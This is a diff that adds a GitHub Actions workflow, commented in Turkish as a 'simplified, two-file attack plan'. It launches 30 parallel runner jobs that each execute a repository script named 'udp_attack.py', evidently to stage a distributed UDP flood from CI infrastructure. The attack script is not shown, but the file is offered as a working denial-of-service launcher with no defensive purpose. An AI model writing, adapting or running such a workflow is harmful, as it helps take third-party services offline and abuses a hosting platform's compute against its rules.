@@ -1,0 +1,23 @@
+# MODIE - Basitleştirilmiş, İki Dosyalı Saldırı Planı
+
+name: LAUNCH ATTACK (SIMPLE)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  execute_attack:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        job_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+
+    steps:
+    # Adım 1: Depodaki tüm dosyaları (udp_attack.py dahil) sanal makineye kopyala
+    - name: Depo Dosyalarını Kopyala
+      uses: actions/checkout@v3
+
+    # Adım 2: Kopyalanan Python betiğini çalıştırarak saldırıyı başlat
+    - name: Saldırıyı Başlat
+      run: python3 udp_attack.py
